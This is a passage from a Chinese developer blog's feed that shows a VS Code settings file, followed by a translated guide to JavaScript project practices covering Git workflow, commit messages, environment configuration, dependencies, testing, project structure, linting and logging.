class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"workbench.activityBar.visible"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"workbench.iconTheme"</span>: <span class="string">"vscode-icons"</span>,</span><br><span class="line">    <span class="attr">"window.menuBarVisibility"</span>: <span class="string">"default"</span>,</span><br><span class="line">    <span class="attr">"editor.minimap.enabled"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"cssrem.rootFontSize"</span>: <span class="number">75</span>,</span><br><span class="line">    <span class="attr">"workbench.colorTheme"</span>: <span class="string">"Atom One Dark"</span>,</span><br><span class="line">    <span class="attr">"editor.fontSize"</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="attr">"liveServer.settings.donotShowInfoMsg"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"editor.cursorStyle"</span>: <span class="string">"block"</span>,</span><br><span class="line">    <span class="attr">"editor.fontFamily"</span>: <span class="string">"Fira Code"</span>,</span><br><span class="line">    <span class="attr">"editor.fontLigatures"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"editor.lineHeight"</span>: <span class="number">24</span>,</span><br><span class="line">    <span class="attr">"editor.lineNumbers"</span>: <span class="string">"on"</span>,</span><br><span class="line">    <span class="attr">"editor.rulers"</span>: [</span><br><span class="line">        <span class="number">120</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"auto-close-tag.SublimeText3Mode"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"vsicons.dontShowNewVersionMessage"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"[javascript]"</span>: &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"window.zoomLevel"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"javascript.implicitProjectConfig.experimentalDecorators"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"Scss2Css.compileAfterSave"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"fileheader.Author"</span>: <span class="string">"poetryxie"</span>,</span><br><span class="line">    <span class="attr">"fileheader.LastModifiedBy"</span>: <span class="string">"poetryxie"</span>,</span><br><span class="line">    <span class="attr">"todohighlight.isEnable"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"workbench.startupEditor"</span>: <span class="string">"newUntitledFile"</span>,</span><br><span class="line">    <span class="attr">"explorer.confirmDragAndDrop"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"gitlens.advanced.messages"</span>: &#123;</span><br><span class="line">        <span class="attr">"suppressCommitHasNoPreviousCommitWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressCommitNotFoundWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressFileNotUnderSourceControlWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressGitVersionWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressLineUncommittedWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressNoRepositoryWarning"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressUpdateNotice"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"suppressWelcomeNotice"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字体美化"><a href="#字体美化" class="headerlink" title="字体美化"></a>字体美化</h2><p>下载链接 <a href="https://pan.baidu.com/s/1jJHRgF0" target="_blank" rel="noopener">https://pan.baidu.com/s/1jJHRgF0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;VS-Code常用插件&quot;&gt;&lt;a href=&quot;#VS-Code常用插件&quot; class=&quot;headerlink&quot; title=&quot;VS Code常用插件&quot;&gt;&lt;/a&gt;VS Code常用插件&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Auto Close Tag&lt;/code&gt; 
      
    
    </summary>
    
      <category term="Tools" scheme="http://blog.poetries.top/categories/Tools/"/>
    
    
      <category term="VS Code" scheme="http://blog.poetries.top/tags/VS-Code/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript工程项目的一系列最佳实践</title>
    <link href="http://blog.poetries.top/2018/01/28/js-perfect-rules/"/>
    <id>http://blog.poetries.top/2018/01/28/js-perfect-rules/</id>
    <published>2018-01-28T12:36:43.000Z</published>
    <updated>2018-04-10T03:33:13.987Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源于互联网</p></blockquote><h2 id="1-Git"><a href="#1-Git" class="headerlink" title="1.Git"></a>1.Git</h2><h3 id="1-1-一些Git规则"><a href="#1-1-一些Git规则" class="headerlink" title="1.1 一些Git规则"></a>1.1 一些Git规则</h3><blockquote><p>这里有一套规则要牢记</p></blockquote><p><strong>在功能分支中执行开发工作</strong></p><ul><li>因为这样，所有的工作都是在专用的分支而不是在主分支上隔离完成的。它允许您提交多个 <code>pull request</code> 而不会导致混乱。您可以持续迭代提交，而不会使得那些很可能还不稳定而且还未完成的代码污染 <code>master</code> 分支</li></ul><p><strong>从 <code>develop</code> 独立出分支</strong></p><ul><li>这样，您可以保持 <code>master</code> 分支中的代码稳定性，这样就不会导致构建问题，并且几乎可以直接用于发布</li></ul><p><strong>永远也不要将分支（直接）推送到 develop 或者 master<br>，请使用合并请求（Pull Request）</strong></p><ul><li>通过这种方式，它可以通知整个团队他们已经完成了某个功能的开发。这样开发伙伴就可以更容易对代码进行 code review，同时还可以互相讨论所提交的需求功能</li></ul><p><strong>在推送所开发的功能并且发起合并请求前，请更新您本地的develop分支并且完成交互式变基操作（interactive rebase）</strong></p><ul><li>ebase 操作会将（本地开发分支）合并到被请求合并的分支（ master 或 develop ）中，并将您本地进行的提交应用于所有历史提交的最顶端，而不会去创建额外的合并提交（假设没有冲突的话），从而可以保持一个漂亮而干净的历史提交记录</li></ul><p><strong>请确保在变基并发起合并请求之前解决完潜在的冲突</strong></p><ul><li>合并分支后删除本地和远程功能分支<ul><li>如果不删除需求分支，大量僵尸分支的存在会导致分支列表的混乱。而且该操作还能确保有且仅有一次合并到master 或 develop。只有当这个功能还在开发中时对应的功能分支才存在</li></ul></li></ul><p><strong>在进行合并请求之前，请确保您的功能分支可以成功构建，并已经通过了所有的测试（包括代码规则检查）</strong></p><ul><li>因为您即将将代码提交到这个稳定的分支。而如果您的功能分支测试未通过，那您的目标分支的构建有很大的概率也会失败。此外，确保在进行合并请求之前应用代码规则检查。因为它有助于我们代码的可读性，并减少格式化的代码与实际业务代码更改混合在一起导致的混乱问题</li></ul><p><strong>使用 这个 <code>.gitignore</code>文件</strong></p><ul><li>此文件已经囊括了不应该和您开发的代码一起推送至远程仓库（remote repository）的系统文件列表。另外，此文件还排除了大多数编辑器的设置文件夹和文件，以及最常见的（工程开发）依赖目录</li></ul><p><strong>保护您的 develop 和 master 分支</strong></p><ul><li>这样可以保护您的生产分支免受意外情况和不可回退的变更</li></ul><h3 id="1-2-Git-工作流"><a href="#1-2-Git-工作流" class="headerlink" title="1.2 Git 工作流"></a>1.2 Git 工作流</h3><blockquote><p>基于以上原因, 我们将 功能分支工作流 ， 交互式变基的使用方法 结合一些 Gitflow中的基础 (比如，命名和使用一个develop branch)一起使用。 主要步骤如下</p></blockquote><p><strong>针对一个新项目, 在您的项目目录初始化您的项目。 如果是（已有项目）随后的功能开发/代码变动，这一步请忽略</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &lt;项目目录&gt;</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p><strong>检出（Checkout） 一个新的功能或故障修复（feature/bug-fix）分支</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b &lt;分支名称&gt;</span><br></pre></td></tr></table></figure><p><strong>新增代码变更</strong></p><blockquote><p>git commit -a 会独立启动一个编辑器用来编辑您的说明信息，这样的好处是可以专注于写这些注释说明</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add</span><br><span class="line">git commit -a</span><br></pre></td></tr></table></figure><p><strong>（切换至功能分支并且）通过交互式变基从您的develop分支中获取最新的代码提交，以更新您的功能分支</strong></p><blockquote><p>您可以使用 –autosquash 将所有提交压缩到单个提交。没有人会愿意（看到） develop 分支中的单个功能开发就占据如此多的提交历史</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;branchname&gt;</span><br><span class="line">git rebase -i --autosquash develop</span><br></pre></td></tr></table></figure><p><strong>如果没有冲突请跳过此步骤，如果您有冲突, 就需要解决它们并且继续变基操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;file1&gt; &lt;file2&gt; ...</span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure><p><strong>推送您的（功能）分支。变基操作会改变提交历史, 所以您必须使用 -f 强制推送到远程（功能）分支。 如果其他人与您在该分支上进行协同开发，请使用破坏性没那么强的 –force-with-lease 参数</strong></p><blockquote><p>当您进行 rebase 操作时，您会改变功能分支的提交历史。这会导致 Git 拒绝正常的 git push 。那么，您只能使用 -f 或 –force 参数了</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure><p><strong>提交一个合并请求（Pull Request）</strong></p><p><strong>Pull Request 会被负责代码审查的同事接受，合并和关闭</strong></p><p><strong>如果您完成了开发，请记得删除您的本地分支。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d &lt;分支&gt;</span><br></pre></td></tr></table></figure><p><strong>（使用以下代码）删除所有已经不在远程仓库维护的分支</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch -p &amp;&amp; <span class="keyword">for</span> branch <span class="keyword">in</span> <span class="string">`git branch -vv | grep ': gone]' | awk '&#123;print $1&#125;'`</span>; <span class="keyword">do</span> git branch -D $branch; done</span><br></pre></td></tr></table></figure><h3 id="1-3-如何写好-Commit-Message"><a href="#1-3-如何写好-Commit-Message" class="headerlink" title="1.3 如何写好 Commit Message"></a>1.3 如何写好 Commit Message</h3><blockquote><p>坚持遵循关于提交的标准指南，会让在与他人合作使用 Git 时更容易。这里有一些经验法则 </p></blockquote><p><strong>用新的空行将标题和主体两者隔开</strong></p><blockquote><p>Git 非常聪明，它可将您提交消息的第一行识别为摘要。实际上，如果您尝试使用 git shortlog ，而不是 git log ，您会看到一个很长的提交消息列表，只会包含提交的 id 以及摘要（，而不会包含主体部分）</p></blockquote><p><strong>将标题行限制为50个字符，并将主体中一行超过72个字符的部分折行显示</strong></p><blockquote><p>提交应尽可能简洁明了，而不是写一堆冗余的描述</p></blockquote><p><strong>标题首字母大写</strong></p><p><strong>不要用句号结束标题</strong></p><p><strong>使用主体部分去解释 是什么 和 为什么 而不是 怎么做</strong></p><h2 id="2-文档"><a href="#2-文档" class="headerlink" title="2. 文档"></a>2. 文档</h2><ul><li>可以使用这个 模板 作为 <a href="https://github.com/wearehive/project-guidelines/blob/master/README.sample.md" target="_blank" rel="noopener">README （的一个参考）</a></li><li>对于具有多个存储库的项目，请在各自的 README 文件中提供它们的链接</li><li>随项目的进展，持续地更新 README</li><li>给您的代码添加详细的注释，这样就可以清楚每个主要部分的含义</li><li>不要把注释作为坏代码的借口。保持您的代码干净整洁</li><li>也不要把那些清晰的代码作为不写注释的借口</li><li>当代码更新，也请确保注释的同步更新</li></ul><h2 id="3-环境"><a href="#3-环境" class="headerlink" title="3. 环境"></a>3. 环境</h2><p><strong>如果需要，请分别定义 development, test 和 production 三个环境</strong></p><blockquote><p>不同的环境可能需要不同的数据、token、API、端口等。您可能需要一个隔离的 development 环境，它调用 mock 的 API，mock 会返回可预测的数据，使自动和手动测试变得更加容易。或者您可能只想在 production 环境中才启用 Google Analytics（分析）</p></blockquote><p><strong>依据不同的环境变量加载部署的相关配置，不要将这些配置作为常量添加到代码库中</strong></p><blockquote><ul><li>您会有令牌，密码和其他有价值的信息。这些配置应正确地从应用程序内部分离开来，这样代码库就可以随时独立发布，不会包含这些敏感配置信息</li><li>怎么做： 使用 .env 文件来存储环境变量，并将其添加到 .gitignore 中使得排除而不被提交（到仓库）。另外，再提交一个 .env.example 作为开发人员的参考配置。对于生产环境，您应该依旧以标准化的方式设置环境变量</li></ul></blockquote><p><strong>建议您在应用程序启动之前校验一下环境变量</strong> </p><blockquote><p>它可能会将其他人从上小时的故障排查中解救</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> joi = <span class="built_in">require</span>(<span class="string">'joi'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> envVarsSchema = joi.object(&#123;  </span><br><span class="line">  NODE_ENV: joi.string()</span><br><span class="line">    .valid([<span class="string">'development'</span>, <span class="string">'production'</span>, <span class="string">'test'</span>, <span class="string">'provision'</span>])</span><br><span class="line">    .required(),</span><br><span class="line">  PORT: joi.number()</span><br><span class="line">    .required(),</span><br><span class="line">  LOGGER_LEVEL: joi.string()</span><br><span class="line">    .valid([<span class="string">'error'</span>, <span class="string">'warn'</span>, <span class="string">'info'</span>, <span class="string">'verbose'</span>, <span class="string">'debug'</span>, <span class="string">'silly'</span>])</span><br><span class="line">    .default(<span class="string">'info'</span>),</span><br><span class="line">  LOGGER_ENABLED: joi.boolean()</span><br><span class="line">    .truthy(<span class="string">'TRUE'</span>)</span><br><span class="line">    .truthy(<span class="string">'true'</span>)</span><br><span class="line">    .falsy(<span class="string">'FALSE'</span>)</span><br><span class="line">    .falsy(<span class="string">'false'</span>)</span><br><span class="line">    .default(<span class="literal">true</span>)</span><br><span class="line">&#125;).unknown()</span><br><span class="line">  .required()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; error, <span class="attr">value</span>: envVars &#125; = joi.validate(process.env, envVarsSchema)  </span><br><span class="line"><span class="keyword">if</span> (error) &#123;  </span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Config validation error: <span class="subst">$&#123;error.message&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;  </span><br><span class="line">  env: envVars.NODE_ENV,</span><br><span class="line">  isTest: envVars.NODE_ENV === <span class="string">'test'</span>,</span><br><span class="line">  isDevelopment: envVars.NODE_ENV === <span class="string">'development'</span>,</span><br><span class="line">  logger: &#123;</span><br><span class="line">    level: envVars.LOGGER_LEVEL,</span><br><span class="line">    enabled: envVars.LOGGER_ENABLED</span><br><span class="line">  &#125;,</span><br><span class="line">  server: &#123;</span><br><span class="line">    port: envVars.PORT</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure><h3 id="3-1-一致的开发环境"><a href="#3-1-一致的开发环境" class="headerlink" title="3.1 一致的开发环境"></a>3.1 一致的开发环境</h3><p><strong>在 package.json 里的 engines 中设置您的node版本</strong></p><ul><li>让其他人可以清晰的知道这个项目中用的什么node版本</li></ul><p><strong>另外，使用 nvm 并在您的项目根目录下创建一个 .nvmrc 文件。不要忘了在文档中标注</strong></p><blockquote><p>任何使用nvm的人都可以使用 nvm use 来切换到合适的node版本</p></blockquote><p><strong>最好设置一个检查 <code>node</code> 和 <code>npm</code> 版本的 <code>preinstall</code> 脚本</strong></p><blockquote><p>某些依赖项可能会在新版本的 npm 中安装失败。</p></blockquote><p><strong>如果可以的话最好使用 Docker 镜像</strong></p><blockquote><p>它可以在整个工作流程中为您提供一致的环境，而且不用花太多的时间来解决依赖或配置</p></blockquote><p><strong>使用本地模块，而不是使用全局安装的模块</strong></p><blockquote><p>您不能指望您的同事在自己的全局环境都安装了相应的模块，本地模块可以方便您分享您的工具</p></blockquote><h3 id="3-2-依赖一致性"><a href="#3-2-依赖一致性" class="headerlink" title="3.2 依赖一致性"></a>3.2 依赖一致性</h3><p><strong>确保您的团队成员获得与您完全相同的依赖。</strong></p><blockquote><ul><li>因为您希望代码在任何开发环境中运行都能像预期的一样</li><li>在<code>npm@5</code>或者更高版本中使用 <code>package-lock.json</code></li></ul></blockquote><ul><li><p>我们没有 <code>npm@5</code></p><ul><li>或者，您可以使用 <code>yarn</code> ，并确保在 <code>README.md</code> 中标注了使用 yarn 。您的锁文件和<code>package.json</code>在每次依赖关系更新后应该具有相同的版本</li></ul></li><li><p>我不太喜欢 <code>Yarn</code></p><ul><li>不喜欢 <code>Yarn</code>，太糟糕了。对于旧版本的<code>npm</code>，在安装新的依赖关系时使用 <code>-save --save-exact</code> ，并在发布之前创建<code>npm-shrinkwrap.json</code></li></ul></li></ul><h2 id="4-依赖"><a href="#4-依赖" class="headerlink" title="4. 依赖"></a>4. 依赖</h2><p><strong>持续跟踪您当前的可用依赖包: 举个例子, <code>npm ls --depth=0</code></strong></p><p><strong>查看这些软件包是否未使用或者与开发项目无关: depcheck</strong></p><blockquote><p>您可能会在代码中包含未使用的库，这会增大生产包的大小。请搜索出这些未使用的依赖关系并去掉它们吧</p></blockquote><p><strong>在使用依赖之前，请检查他的下载统计信息，看看它是否被社区大量使用： npm-stat</strong></p><blockquote><p>更多的使用量很大程度上意味着更多的贡献者，这通常意味着拥有更好的维护，这些能确保错误能够被快速地发现并修复</p></blockquote><p><strong>在使用依赖之前，请检查它是否具有良好而成熟的版本发布频率与大量的维护者：例如， npm view async</strong></p><blockquote><p>如果维护者没有足够快地合并修补程序，那么这些贡献者也将会变得不积极不高效</p></blockquote><p><strong>如果需要使用那些不太熟悉的依赖包，请在使用之前与团队进行充分讨论</strong></p><p><strong>始终确保您的应用程序在最新版本的依赖包上面能正常运行，而不是无法使用：npm outdated</strong></p><blockquote><p>依赖关系更新有时包含破坏性更改。当显示需要更新时，请始终先查看其发行说明。并逐一地更新您的依赖项，如果出现任何问题，可以使故障排除更容易。可以使用类似 npm-check-updates 的酷炫工具</p></blockquote><h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2><p><strong>如果需要，请构建一个 test 环境.</strong></p><blockquote><p>虽然有时在 production 模式下端到端测试可能看起来已经足够了，但有一些例外：比如您可能不想在生产环境下启用数据分析功能，只能用测试数据来填充（污染）某人的仪表板。另一个例子是，您的API可能在 production 中才具有速率限制，并在请求达到一定量级后会阻止您的测试请求</p></blockquote><p><strong>将测试文件放在使用 <em> .test.js 或 </em> .spec.js 命名约定的测试模块，比如 moduleName.spec.js</strong></p><blockquote><p>您肯定不想进入一个层次很深的文件夹结构来查找里面的单元测试</p></blockquote><p><strong>将其他测试文件放入独立的测试文件夹中以避免混淆</strong></p><blockquote><p>一些测试文件与任何特定的文件实现没有特别的关系。您只需将它放在最有可能被其他开发人员找到的文件夹中：<strong>test</strong> 文件夹。这个名字：<strong>test</strong>也是现在的标准，被大多数JavaScript测试框架所接受</p></blockquote><p><strong>编写可测试代码，避免副作用（side effects），提取副作用，编写纯函数</strong></p><ul><li>您想要将业务逻辑拆分为单独的测试单元。您必须“尽量减少不可预测性和非确定性过程对代码可靠性的影响”</li><li>纯函数是一种总是为相同的输入返回相同输出的函数。相反地，不纯的函数是一种可能会有副作用，或者取决于来自外部的条件来决定产生对应的输出值的函数。这使得它不那么可预测</li></ul><p><strong>使用静态类型检查器</strong></p><ul><li>有时您可能需要一个静态类型检查器。它为您的代码带来一定程度的可靠性</li></ul><p><strong>先在本地 develop 分支运行测试，待测试通过后，再进行pull请求</strong></p><ul><li>您不想成为一个导致生产分支构建失败的人吧。在您的rebase之后运行测试，然后再将您改动的功能分支推送到远程仓库。</li></ul><p><strong>记录您的测试，包括在 README 文件中的相关说明部分</strong></p><ul><li>这是您为其他开发者或者 DevOps 专家或者 QA 或者其他如此幸运能和您一起协作的人留下的便捷笔记</li></ul><h2 id="6-结构布局与命名"><a href="#6-结构布局与命名" class="headerlink" title="6. 结构布局与命名"></a>6. 结构布局与命名</h2><p><strong>请围绕产品功能/页面/组件，而不是围绕角色来组织文件。此外，请将测试文件放在他们对应实现的旁边</strong></p><ul><li>不规范</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── controllers</span><br><span class="line">|   ├── product.js</span><br><span class="line">|   └── user.js</span><br><span class="line">├── models</span><br><span class="line">|   ├── product.js</span><br><span class="line">|   └── user.js</span><br></pre></td></tr></table></figure><ul><li>规范</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── product</span><br><span class="line">|   ├── index.js</span><br><span class="line">|   ├── product.js</span><br><span class="line">|   └── product.test.js</span><br><span class="line">├── user</span><br><span class="line">|   ├── index.js</span><br><span class="line">|   ├── user.js</span><br><span class="line">|   └── user.test.js</span><br></pre></td></tr></table></figure><blockquote><p>比起一个冗长的列表文件，创建一个单一责权封装的小模块，并在其中包括测试文件。将会更容易浏览，更一目了然</p></blockquote><p><strong>将其他测试文件放在单独的测试文件夹中以避免混淆</strong></p><ul><li>这样可以节约您的团队中的其他开发人员或DevOps专家的时间</li></ul><p><strong>使用 ./config 文件夹，不要为不同的环境制作不同的配置文件。</strong></p><blockquote><p>当您为不同的目的（数据库，API等）分解不同的配置文件;将它们放在具有容易识别名称（如 config ）的文件夹中才是有意义的。请记住不要为不同的环境制作不同的配置文件。这样并不是具有扩展性的做法，如果这样，就会导致随着更多应用程序部署被创建出来，新的环境名称也会不断被创建，非常混乱。 配置文件中使用的值应通过环境变量提供</p></blockquote><p><strong>将脚本文件放在./scripts文件夹中。包括 bash 脚本和 node 脚本。</strong></p><ul><li>很可能最终会出现很多脚本文件，比如生产构建，开发构建，数据库feeders，数据库同步等</li></ul><p><strong>将构建输出结果放在./build文件夹中。将build/添加到.gitignore中以便忽略此文件夹</strong></p><blockquote><p>命名为您最喜欢的就行，dist看起来也蛮酷的。但请确保与您的团队保持一致性。放置在该文件夹下的东西应该是已经生成（打包、编译、转换）或者被移到这里的。您产生什么编译结果，您的队友也可以生成同样的结果，所以没有必要将这些结果提交到远程仓库中。除非您故意希望提交上去。</p></blockquote><p><strong>文件名和目录名请使用 PascalCase camelCase 风格。组件请使用 PascalCase 风格</strong></p><p><strong>CheckBox/index.js 应该代表 CheckBox 组件，也可以写成 CheckBox.js ，但是不能写成冗长的 CheckBox/CheckBox.js 或 checkbox/CheckBox.js</strong></p><p><strong>理想情况下，目录名称应该和 index.js 的默认导出名称相匹配。</strong></p><ul><li>这样您就可以通过简单地导入其父文件夹直接使用您预期的组件或模块</li></ul><h2 id="7-代码风格"><a href="#7-代码风格" class="headerlink" title="7. 代码风格"></a>7. 代码风格</h2><h3 id="7-1-若干个代码风格指导"><a href="#7-1-若干个代码风格指导" class="headerlink" title="7.1 若干个代码风格指导"></a>7.1 若干个代码风格指导</h3><p><strong>对新项目请使用 Stage2 和更高版本的 JavaScript（现代化）语法。对于老项目，保持与老的语法一致，除非您打算把老的项目也更新为现代化风格</strong></p><ul><li>这完全取决于您的选择。我们使用转换器来使用新的语法糖。Stage2更有可能最终成为规范的一部分，而且仅仅只需经过小版本的迭代就会成为规范</li></ul><p><strong>在构建过程中包含代码风格检查</strong></p><ul><li>在构建时中断下一步操作是一种强制执行代码风格检查的方法。强制您认真对待代码。请确保在客户端和服务器端代码都执行代码检查</li></ul><p><strong>使用 ESLint - Pluggable JavaScript linter 去强制执行代码检查</strong></p><ul><li>我们个人很喜欢 eslint ，不强制您也喜欢。它拥有支持更多的规则，配置规则的能力和添加自定义规则的能力</li></ul><p><strong>针对 JavaScript 我们使用Airbnb JavaScript Style Guide , 更多请阅读。 请依据您的项目和您的团队选择使用所需的JavaScript 代码风格</strong></p><p><strong>当使用FlowType的时候，我们使用 ESLint的Flow样式检查规则。</strong></p><ul><li>Flow 引入了很少的语法，而这些语法仍然需要遵循代码风格并进行检查</li></ul><p><strong>使用 .eslintignore 将某些文件或文件夹从代码风格检查中排除</strong></p><ul><li>当您需要从风格检查中排除几个文件时，就再也不需要通过 eslint-disable 注释来污染您的代码了</li></ul><p><strong>在Pull Request之前，请删除任何 eslint 的禁用注释</strong></p><ul><li>在处理代码块时禁用风格检查是正常现象，这样就可以关注在业务逻辑。请记住把那些 eslint-disable 注释删除并遵循风格规则</li></ul><p><strong>根据任务的大小使用 //TODO： 注释或做一个标签（ticket）</strong></p><blockquote><p>这样您就可以提醒自己和他人有这样一个小的任务需要处理（如重构一个函数或更新一个注释）。对于较大的任务，可以使用由一个lint规则（no-warning-comments）强制要求其完成（并移除注释）的//TODO（＃3456），其中的#3456号码是一个标签（ticket），方便查找且防止相似的注释堆积导致混乱</p></blockquote><p><strong>随着代码的变化，始终保持注释的相关性。删除那些注释掉的代码块</strong></p><ul><li>代码应该尽可能的可读，您应该摆脱任何分心的事情。如果您在重构一个函数，就不要注释那些旧代码，直接把要注释的代码删除吧</li></ul><p><strong>避免不相关的和搞笑的的注释，日志或命名</strong></p><p><strong>请使用有意义容易搜索的命名，避免缩写名称。对于函数使用长描述性命名。功能命名应该是一个动词或动词短语，需要能清楚传达意图的命名。</strong></p><p><strong>依据《代码整洁之道》的step-down规则，对您的源代码文件中的函数（的声明）进行组织。高抽象级别的函数（调用了低级别函数的函数）在上，低抽象级别函数在下，（保证了阅读代码时遇到未出现的函数仍然是从上往下的顺序，而不会打断阅读顺序地往前查找并且函数的抽象层次依次递减）。</strong></p><h3 id="7-2-强制的代码风格标准"><a href="#7-2-强制的代码风格标准" class="headerlink" title="7.2 强制的代码风格标准"></a>7.2 强制的代码风格标准</h3><p><strong>让您的编辑器提示您关于代码风格方面的错误。 请将 <a href="https://github.com/prettier/eslint-plugin-prettier" target="_blank" rel="noopener">eslint-plugin-prettier</a> 与 <a href="https://github.com/prettier/eslint-config-prettier" target="_blank" rel="noopener">eslint-config-prettier</a> 和您目前的ESLint配置一起搭配使用</strong></p><p><strong>考虑使用Git钩子</strong></p><ul><li>Git的钩子能大幅度地提升开发者的生产力。在做出改变、提交、推送至暂存区或者生产环境的过程中（充分检验代码），再也不需要担心（推送的代码会导致）构建失败</li></ul><p><strong>将Git的precommit钩子与Prettier结合使用</strong></p><blockquote><p>虽然prettier自身已经非常强大，但是每次将其作为单独的一个npm任务去格式化代码，并不是那么地高效。 这正是lint-staged（还有husky）可以解决的地方。关于如何配置 lint-staged 请阅读这里 以及如何配置 husky 请阅读</p></blockquote><h2 id="8-日志"><a href="#8-日志" class="headerlink" title="8. 日志"></a>8. 日志</h2><p><strong>避免在生产环境中使用客户端的控制台日志</strong></p><ul><li>您在构建过程可以把（应该）它们去掉，但是请确保您在代码风格检查中提供了有关控制台日志的警告信息。</li></ul><p><strong>产出生产环境的可读生产日志记录。一般使用在生产模式下所使用的日志记录库 (比如 winston 或者 node-bunyan)。</strong></p><blockquote><p>它通过添加着色、时间戳、log到控制台或者文件中，甚至是夜以继日地轮流log到文件，来减少故障排除中那些令人不愉快的事情。</p></blockquote><h2 id="9-API"><a href="#9-API" class="headerlink" title="9. API"></a>9. API</h2><h3 id="9-1-API-设计"><a href="#9-1-API-设计" class="headerlink" title="9.1 API 设计"></a>9.1 API 设计</h3><ul><li>因为我们试图实施开发出结构稳健的 Restful 接口，让团队成员和客户可以简单而一致地使用它们</li><li>缺乏一致性和简单性会大大增加集成和维护的成本。这就是为什么API设计这部分会包含在这个文档中的原因</li></ul><p><strong>我们主要遵循资源导向的设计方式。它有三个主要要素：资源，集合和 